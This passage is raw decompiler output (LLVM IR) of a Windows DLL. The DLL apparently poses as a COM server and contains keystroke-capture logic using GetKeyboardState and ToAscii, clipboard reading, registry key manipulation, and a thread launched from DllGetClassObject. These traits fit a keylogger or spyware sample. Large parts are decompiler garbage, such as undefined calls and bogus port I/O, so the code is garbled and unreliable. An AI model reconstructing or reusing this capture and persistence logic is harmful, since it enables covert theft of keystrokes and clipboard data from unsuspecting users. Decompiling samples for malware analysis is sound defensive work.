  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !530
  %1 = call i32 @function_40438c(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i32 -2147483647), !insn.addr !531
  %2 = icmp eq i32 %1, 0, !insn.addr !532
  %3 = icmp eq i1 %2, false, !insn.addr !533
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !533
  br i1 %3, label %dec_label_pc_404db2, label %dec_label_pc_404d6d, !insn.addr !533

dec_label_pc_404d6d:                              ; preds = %dec_label_pc_404d38
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !534
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !535
  %5 = call i32 @function_404394(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_4080f8, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_404de0, i32 0, i32 0), i32 -2147483647), !insn.addr !535
  %6 = icmp eq i32 %5, 0, !insn.addr !536
  %7 = icmp eq i1 %6, false, !insn.addr !537
  br i1 %7, label %dec_label_pc_404da9, label %dec_label_pc_404d99, !insn.addr !537

dec_label_pc_404d99:                              ; preds = %dec_label_pc_404d6d
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !538
  br label %dec_label_pc_404da9, !insn.addr !538

dec_label_pc_404da9:                              ; preds = %dec_label_pc_404d99, %dec_label_pc_404d6d
  %9 = call i32 @function_404374(), !insn.addr !539
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !539
  br label %dec_label_pc_404db2, !insn.addr !539

dec_label_pc_404db2:                              ; preds = %dec_label_pc_404da9, %dec_label_pc_404d38
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !540
}

define i32 @function_404dbb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404dbb:
  %esp.1.reg2mem = alloca i32, !insn.addr !541
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !541
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !541
  %6 = inttoptr i32 %3 to i32*, !insn.addr !541
  store i32 %5, i32* %6, align 4, !insn.addr !541
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !542
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !542
  %11 = add i8 %8, %10, !insn.addr !542
  %12 = inttoptr i32 %9 to i8*, !insn.addr !542
  store i8 %11, i8* %12, align 1, !insn.addr !542
  %13 = add i32 %1, 122, !insn.addr !543
  %14 = inttoptr i32 %13 to i8*, !insn.addr !543
  %15 = load i8, i8* %14, align 1, !insn.addr !543
  %16 = udiv i32 %4, 256, !insn.addr !543
  %17 = trunc i32 %16 to i8, !insn.addr !543
  %18 = add i8 %15, %17, !insn.addr !543
  store i8 %18, i8* %14, align 1, !insn.addr !543
  %19 = load i8, i8* %7, align 4, !insn.addr !544
  %20 = load i32, i32* %eax, align 4, !insn.addr !544
  %21 = trunc i32 %20 to i8, !insn.addr !544
  %22 = add i8 %19, %21, !insn.addr !544
  %23 = icmp eq i8 %22, 0, !insn.addr !544
  %24 = inttoptr i32 %20 to i8*, !insn.addr !544
  store i8 %22, i8* %24, align 1, !insn.addr !544
  %25 = trunc i32 %3 to i16, !insn.addr !545
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !545
  br i1 %23, label %26, label %dec_label_pc_404dc9, !insn.addr !546

; <label>:26:                                     ; preds = %dec_label_pc_404dbb
  %27 = call i32 @unknown_4e40(), !insn.addr !546
  br label %dec_label_pc_404dc9, !insn.addr !546

dec_label_pc_404dc9:                              ; preds = %26, %dec_label_pc_404dbb
  %28 = icmp ult i8 %22, %19, !insn.addr !544
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !547
  store i32 %29, i32* %eax, align 4, !insn.addr !547
  br i1 %28, label %dec_label_pc_404e31, label %dec_label_pc_404dcc, !insn.addr !548

dec_label_pc_404dcc:                              ; preds = %dec_label_pc_404dc9
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !549, !insn.addr !544
  %31 = and i8 %30, 1, !insn.addr !544
  %32 = icmp eq i8 %31, 0, !insn.addr !544
  %33 = trunc i32 %arg4 to i16, !insn.addr !550
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !550
  %35 = inttoptr i32 %2 to i32*, !insn.addr !550
  store i32 %34, i32* %35, align 4, !insn.addr !550
  br i1 %32, label %dec_label_pc_404e2c, label %dec_label_pc_404dd0, !insn.addr !551

dec_label_pc_404dd0:                              ; preds = %dec_label_pc_404dcc
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !552
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !553
  %36 = add i32 %arg4, 1, !insn.addr !554
  %37 = icmp eq i32 %36, 0, !insn.addr !554
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !555
  br i1 %37, label %dec_label_pc_404e37, label %dec_label_pc_404dd6, !insn.addr !555

dec_label_pc_404dd6:                              ; preds = %dec_label_pc_404dd0
  %38 = load i32, i32* %eax, align 4, !insn.addr !556
  %39 = add i32 %38, -1, !insn.addr !556
  store i32 %39, i32* %eax, align 4, !insn.addr !556
  %40 = trunc i32 %36 to i16, !insn.addr !557
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !557
  %42 = load i32, i32* %41, align 4, !insn.addr !557
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !557
  %43 = load i32, i32* %41, align 4, !insn.addr !558
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !558
  %44 = add i32 %arg7, 105, !insn.addr !559
  %45 = inttoptr i32 %44 to i8*, !insn.addr !559
  %46 = load i8, i8* %45, align 1, !insn.addr !559
  %47 = trunc i32 %39 to i8, !insn.addr !559
  %48 = add i8 %46, %47, !insn.addr !559
  %49 = icmp ult i8 %48, %46, !insn.addr !559
  store i8 %48, i8* %45, align 1, !insn.addr !559
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !560
  br i1 %49, label %dec_label_pc_404e57, label %dec_label_pc_404de4, !insn.addr !560

dec_label_pc_404de4:                              ; preds = %dec_label_pc_404dd6
  %50 = icmp eq i8 %48, 0, !insn.addr !559
  br i1 %50, label %dec_label_pc_404e06, label %dec_label_pc_404de6, !insn.addr !561

dec_label_pc_404de6:                              ; preds = %dec_label_pc_404de4
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !562
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_404e57

dec_label_pc_404e06:                              ; preds = %dec_label_pc_404de4
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !563
  %53 = load i32, i32* %52, align 4, !insn.addr !563
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !563
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !564
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !565
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !566
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !567
  %55 = add i32 %arg6, -8, !insn.addr !568
  %56 = inttoptr i32 %55 to i32*, !insn.addr !568
  store i32 0, i32* %56, align 4, !insn.addr !568
  %57 = add i32 %arg6, -12, !insn.addr !569
  %58 = inttoptr i32 %57 to i32*, !insn.addr !569
  store i32 1, i32* %58, align 4, !insn.addr !569
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !570
  ret i32 %57, !insn.addr !570

dec_label_pc_404e2c:                              ; preds = %dec_label_pc_404dcc
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !571

dec_label_pc_404e31:                              ; preds = %dec_label_pc_404dc9
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !572
  %62 = add i8 %60, %61, !insn.addr !572
  %63 = inttoptr i32 %2 to i8*, !insn.addr !572
  store i8 %62, i8* %63, align 1, !insn.addr !572
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !573
  %65 = load i8, i8* %64, align 1, !insn.addr !573
  %66 = udiv i32 %arg3, 256, !insn.addr !573
  %67 = trunc i32 %66 to i8, !insn.addr !573
  %68 = add i8 %65, %67, !insn.addr !573
  store i8 %68, i8* %64, align 1, !insn.addr !573
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !573
  br label %dec_label_pc_404e37, !insn.addr !573

dec_label_pc_404e37:                              ; preds = %dec_label_pc_404e31, %dec_label_pc_404dd0
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !574
  %70 = inttoptr i32 %69 to i32*, !insn.addr !574
  store i32 0, i32* %70, align 4, !insn.addr !574
  %71 = add i32 %esp.0, -8, !insn.addr !575
  %72 = inttoptr i32 %71 to i32*, !insn.addr !575
  store i32 0, i32* %72, align 4, !insn.addr !575
  %73 = add i32 %esp.0, -12, !insn.addr !576
  %74 = inttoptr i32 %73 to i32*, !insn.addr !576
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* %74, align 4, !insn.addr !576
  %75 = add i32 %esp.0, -16, !insn.addr !577
  %76 = inttoptr i32 %75 to i32*, !insn.addr !577
  store i32 -2147483647, i32* %76, align 4, !insn.addr !577
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !578
  %78 = call i32 @function_4034c8(), !insn.addr !579
  %79 = add i32 %78, 1, !insn.addr !580
  %80 = add i32 %esp.0, -20, !insn.addr !581
  %81 = inttoptr i32 %80 to i32*, !insn.addr !581
  store i32 %79, i32* %81, align 4, !insn.addr !581
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !582
  br label %dec_label_pc_404e57, !insn.addr !582

dec_label_pc_404e57:                              ; preds = %dec_label_pc_404de6, %dec_label_pc_404e37, %dec_label_pc_404dd6
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036c8(), !insn.addr !583
  %83 = add i32 %esp.1.reload, -4, !insn.addr !584
  %84 = inttoptr i32 %83 to i32*, !insn.addr !584
  store i32 %82, i32* %84, align 4, !insn.addr !584
  %85 = add i32 %esp.1.reload, -8, !insn.addr !585
  %86 = inttoptr i32 %85 to i32*, !insn.addr !585
  store i32 1, i32* %86, align 4, !insn.addr !585
  %87 = add i32 %esp.1.reload, -12, !insn.addr !586
  %88 = inttoptr i32 %87 to i32*, !insn.addr !586
  store i32 0, i32* %88, align 4, !insn.addr !586
  %89 = add i32 %esp.1.reload, -16, !insn.addr !587
  %90 = inttoptr i32 %89 to i32*, !insn.addr !587
  store i32 ptrtoint ([10 x i8]* @global_var_404eb8 to i32), i32* %90, align 4, !insn.addr !587
  %91 = add i32 %arg6, -8, !insn.addr !588
  %92 = inttoptr i32 %91 to i32*, !insn.addr !588
  %93 = load i32, i32* %92, align 4, !insn.addr !588
  %94 = add i32 %esp.1.reload, -20, !insn.addr !589
  %95 = inttoptr i32 %94 to i32*, !insn.addr !589
  store i32 %93, i32* %95, align 4, !insn.addr !589
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !590
  %97 = load i32, i32* %92, align 4, !insn.addr !591
  %98 = add i32 %esp.1.reload, -24, !insn.addr !592
  %99 = inttoptr i32 %98 to i32*, !insn.addr !592
  store i32 %97, i32* %99, align 4, !insn.addr !592
  %100 = call i32 @function_404374(), !insn.addr !593
  %101 = load i32, i32* %99, align 4, !insn.addr !594
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !595
  store i32 4214421, i32* %90, align 4, !insn.addr !596
  %102 = call i32 @"@LStrClr"(), !insn.addr !597
  ret i32 %102, !insn.addr !598
}

define i32 @function_404e8e() local_unnamed_addr {
dec_label_pc_404e8e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !599
  ret i32 %0, !insn.addr !599
}

define i32 @function_404e93() local_unnamed_addr {
dec_label_pc_404e93:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !600
}

define i32 @function_404e95() local_unnamed_addr {
dec_label_pc_404e95:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !601
}

define i32 @function_404e99(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_404e99:
  %.reg2mem = alloca i32, !insn.addr !602
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !602
  %5 = inttoptr i32 %2 to i8*, !insn.addr !602
  store i8 %4, i8* %5, align 1, !insn.addr !602
  %6 = add i32 %0, 111, !insn.addr !603
  %7 = inttoptr i32 %6 to i8*, !insn.addr !603
  %8 = load i8, i8* %7, align 1, !insn.addr !603
  %9 = trunc i32 %1 to i8, !insn.addr !603
  %10 = add i8 %8, %9, !insn.addr !603
  %11 = icmp eq i8 %10, 0, !insn.addr !603
  store i8 %10, i8* %7, align 1, !insn.addr !603
  br i1 %11, label %12, label %dec_label_pc_404ea1, !insn.addr !604

; <label>:12:                                     ; preds = %dec_label_pc_404e99
  %13 = call i32 @unknown_4f18(), !insn.addr !604
  br label %dec_label_pc_404ea1, !insn.addr !604

dec_label_pc_404ea1:                              ; preds = %12, %dec_label_pc_404e99
  %14 = icmp ult i8 %10, %8, !insn.addr !603
  br i1 %14, label %dec_label_pc_404f09, label %dec_label_pc_404ea4, !insn.addr !605

dec_label_pc_404ea4:                              ; preds = %dec_label_pc_404ea1
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !549, !insn.addr !603
  %16 = and i8 %15, 1, !insn.addr !603
  %17 = icmp eq i8 %16, 0, !insn.addr !603
  %18 = trunc i32 %arg4 to i16, !insn.addr !606
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !606
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !606
  store i32 %19, i32* %20, align 4, !insn.addr !606
  br i1 %17, label %dec_label_pc_404f04, label %dec_label_pc_404ea8, !insn.addr !607

dec_label_pc_404ea8:                              ; preds = %dec_label_pc_404ea4
  %21 = add i32 %arg4, 1, !insn.addr !608
  %22 = icmp eq i32 %21, 0, !insn.addr !608
  store i32 %arg2, i32* %.reg2mem, !insn.addr !609
  br i1 %22, label %dec_label_pc_404f0f, label %dec_label_pc_404eae, !insn.addr !609

dec_label_pc_404eae:                              ; preds = %dec_label_pc_404ea8
  %23 = add i32 %arg2, -1, !insn.addr !610
  %24 = trunc i32 %21 to i16, !insn.addr !611
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !611
  %26 = load i32, i32* %25, align 4, !insn.addr !611
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !611
  %27 = load i32, i32* %25, align 4, !insn.addr !612
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !612
  %28 = add i32 %arg7, 105, !insn.addr !613
  %29 = inttoptr i32 %28 to i8*, !insn.addr !613
  %30 = load i8, i8* %29, align 1, !insn.addr !613
  %31 = trunc i32 %23 to i8, !insn.addr !613
  %32 = add i8 %30, %31, !insn.addr !613
  %33 = icmp eq i8 %32, 0, !insn.addr !613
  store i8 %32, i8* %29, align 1, !insn.addr !613
  br i1 %33, label %dec_label_pc_404ede, label %dec_label_pc_404ebe, !insn.addr !614

dec_label_pc_404ebe:                              ; preds = %dec_label_pc_404eae
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !615
  %34 = inttoptr i32 %23 to i8*, !insn.addr !616
  %35 = load i8, i8* %34, align 1, !insn.addr !616
  %36 = add i8 %35, %31, !insn.addr !616
  store i8 %36, i8* %34, align 1, !insn.addr !616
  %37 = add i32 %arg5, 86, !insn.addr !617
  %38 = inttoptr i32 %37 to i8*, !insn.addr !617
  %39 = load i8, i8* %38, align 1, !insn.addr !617
  %40 = trunc i32 %21 to i8, !insn.addr !617
  %41 = add i8 %39, %40, !insn.addr !617
  store i8 %41, i8* %38, align 1, !insn.addr !617
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !618
  %42 = call i32 @"@LStrClr"(), !insn.addr !619
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !620
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !621
  %44 = zext i1 %43 to i32, !insn.addr !622
  ret i32 %44, !insn.addr !622

dec_label_pc_404ede:                              ; preds = %dec_label_pc_404eae
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !623
  %46 = inttoptr i32 %45 to i8*, !insn.addr !623
  %47 = load i8, i8* %46, align 2, !insn.addr !623
  %48 = mul i8 %47, 2, !insn.addr !623
  store i8 %48, i8* %46, align 2, !insn.addr !623
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !624
  %50 = icmp eq i32* %49, null, !insn.addr !625
  br i1 %50, label %dec_label_pc_404f09, label %dec_label_pc_404eee, !insn.addr !626

dec_label_pc_404eee:                              ; preds = %dec_label_pc_404ede
  %51 = ptrtoint i32* %49 to i32, !insn.addr !624
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !627
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !628
  %53 = icmp eq i32* %52, null, !insn.addr !629
  br i1 %53, label %dec_label_pc_404f09, label %dec_label_pc_404efa, !insn.addr !630

dec_label_pc_404efa:                              ; preds = %dec_label_pc_404eee
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !631
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !632
  br label %dec_label_pc_404f04, !insn.addr !632

dec_label_pc_404f04:                              ; preds = %dec_label_pc_404efa, %dec_label_pc_404ea4
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !633
  br label %dec_label_pc_404f09, !insn.addr !633

dec_label_pc_404f09:                              ; preds = %dec_label_pc_404f04, %dec_label_pc_404eee, %dec_label_pc_404ede, %dec_label_pc_404ea1
  %56 = call i1 @CloseClipboard(), !insn.addr !634
  %57 = sext i1 %56 to i32, !insn.addr !634
  store i32 %57, i32* %.reg2mem, !insn.addr !635
  br label %dec_label_pc_404f0f, !insn.addr !635

dec_label_pc_404f0f:                              ; preds = %dec_label_pc_404ea8, %dec_label_pc_404f09
  %.reload = load i32, i32* %.reg2mem, !insn.addr !636
  ret i32 %.reload, !insn.addr !636
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_404f14:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !637
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !637
  %3 = load i32, i32* inttoptr (i32 4227384 to i32*), align 8, !insn.addr !638
  %4 = inttoptr i32 %3 to i32*, !insn.addr !639
  %5 = load i32, i32* %4, align 4, !insn.addr !639
  %6 = icmp eq i32 %5, 0, !insn.addr !639
  %7 = icmp eq i1 %6, false, !insn.addr !640
  %8 = icmp eq i1 %7, false, !insn.addr !641
  br i1 %8, label %dec_label_pc_404f50, label %dec_label_pc_404f27, !insn.addr !641

dec_label_pc_404f27:                              ; preds = %dec_label_pc_404f14
  %9 = inttoptr i32 %0 to i8*, !insn.addr !642
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !643
  %11 = icmp eq i32* %10, null, !insn.addr !644
  %12 = icmp eq i1 %11, false, !insn.addr !645
  br i1 %12, label %dec_label_pc_404f50, label %dec_label_pc_404f3a, !insn.addr !645

dec_label_pc_404f3a:                              ; preds = %dec_label_pc_404f27
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4220780 to i32*), i32 0, i32* null), !insn.addr !646
  br label %dec_label_pc_404f50, !insn.addr !646

dec_label_pc_404f50:                              ; preds = %dec_label_pc_404f3a, %dec_label_pc_404f27, %dec_label_pc_404f14
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !647
  store i32 0, i32* %15, align 4, !insn.addr !647
  ret i32 -2147221231, !insn.addr !648
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_404f7c:
  ret i32 0, !insn.addr !649
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_404f80:
  ret i32 0, !insn.addr !650
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_404f84:
  ret i32 0, !insn.addr !651
}

define i32 @function_404f88() local_unnamed_addr {
dec_label_pc_404f88:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !652
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !652
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !652
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !653
  %2 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !654
  %3 = add i32 %2, 1, !insn.addr !654
  store i32 %3, i32* @global_var_4096a4, align 4, !insn.addr !654
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !655
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !656
  ret i32 0, !insn.addr !657
}

define i32 @function_404fad() local_unnamed_addr {
dec_label_pc_404fad:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !658
  ret i32 %0, !insn.addr !658
}

define i32 @function_404fb2() local_unnamed_addr {
dec_label_pc_404fb2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !659
}

define i32 @function_404fb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !660
}

define i32 @function_404fb8() local_unnamed_addr {
dec_label_pc_404fb8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !661
  %2 = add i32 %1, -1, !insn.addr !661
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !661
  ret i32 %0, !insn.addr !662
}

define i32 @function_404fc0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404fc0:
  %esp.0.reg2mem = alloca i32, !insn.addr !663
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !664
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !664
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !664
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !665
  %4 = call i32 @function_407250(), !insn.addr !666
  %5 = icmp ne i32 %4, 0, !insn.addr !667
  %6 = icmp eq i1 %5, false, !insn.addr !668
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !669
  br i1 %6, label %dec_label_pc_4050bb, label %dec_label_pc_404ffd, !insn.addr !669

dec_label_pc_404ffd:                              ; preds = %dec_label_pc_404fc0
  switch i32 %0, label %dec_label_pc_405047 [
    i32 8, label %dec_label_pc_40500b
    i32 46, label %dec_label_pc_40502a
  ]

dec_label_pc_40500b:                              ; preds = %dec_label_pc_404ffd
  %7 = call i32 @function_4072ec(), !insn.addr !670
  %8 = call i32 @"@LStrDelete"(), !insn.addr !671
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !672
  br label %dec_label_pc_4050bb, !insn.addr !672

dec_label_pc_40502a:                              ; preds = %dec_label_pc_404ffd
  %9 = call i32 @function_4072ec(), !insn.addr !673
  %10 = call i32 @"@LStrDelete"(), !insn.addr !674
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !675
  br label %dec_label_pc_4050bb, !insn.addr !675

dec_label_pc_405047:                              ; preds = %dec_label_pc_404ffd
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !676
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !677
  %14 = udiv i32 %1, 65536, !insn.addr !678
  %15 = and i32 %14, 255, !insn.addr !679
  %16 = inttoptr i32 %15 to i16*, !insn.addr !680
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !681
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !682
  %19 = icmp eq i32 %18, 1, !insn.addr !683
  %20 = icmp eq i1 %19, false, !insn.addr !684
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !684
  br i1 %20, label %dec_label_pc_4050bb, label %dec_label_pc_405073, !insn.addr !684

dec_label_pc_405073:                              ; preds = %dec_label_pc_405047
  %21 = call i32 @function_406fb4(), !insn.addr !685
  %22 = icmp eq i32 %21, 0, !insn.addr !686
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !687
  br i1 %22, label %dec_label_pc_4050bb, label %dec_label_pc_40507f, !insn.addr !687

dec_label_pc_40507f:                              ; preds = %dec_label_pc_405073
  %23 = call i32 @function_4034c8(), !insn.addr !688
  %24 = icmp sgt i32 %23, 15, !insn.addr !689
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !689
  br i1 %24, label %dec_label_pc_4050bb, label %dec_label_pc_405090, !insn.addr !689

dec_label_pc_405090:                              ; preds = %dec_label_pc_40507f
  %25 = call i32 @function_4072ec(), !insn.addr !690
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !691
  %27 = call i32 @"@LStrInsert"(), !insn.addr !692
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !692
  br label %dec_label_pc_4050bb, !insn.addr !692

dec_label_pc_4050bb:                              ; preds = %dec_label_pc_405090, %dec_label_pc_40507f, %dec_label_pc_405073, %dec_label_pc_405047, %dec_label_pc_40502a, %dec_label_pc_40500b, %dec_label_pc_404fc0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !693
  %29 = load i32, i32* %28, align 4, !insn.addr !693
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !694
  %30 = add i32 %esp.0.reload, 8, !insn.addr !695
  %31 = inttoptr i32 %30 to i32*, !insn.addr !695
  store i32 4215003, i32* %31, align 4, !insn.addr !695
  %32 = call i32 @"@LStrClr"(), !insn.addr !696
  ret i32 %32, !insn.addr !697
}

define i32 @function_4050d4() local_unnamed_addr {
dec_label_pc_4050d4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !698
  ret i32 %0, !insn.addr !698
}

define i32 @function_4050d9() local_unnamed_addr {
dec_label_pc_4050d9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !699
}

define i32 @function_4050db(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050db:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !700
}

define i32 @function_4050e4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050e4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !701
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !701
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !701
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !702
  %2 = call i32 @function_407250(), !insn.addr !703
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !704
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !705
  %4 = add i32 %1, 8, !insn.addr !706
  %5 = inttoptr i32 %4 to i32*, !insn.addr !706
  store i32 4215210, i32* %5, align 4, !insn.addr !706
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !707
  ret i32 %6, !insn.addr !708
}

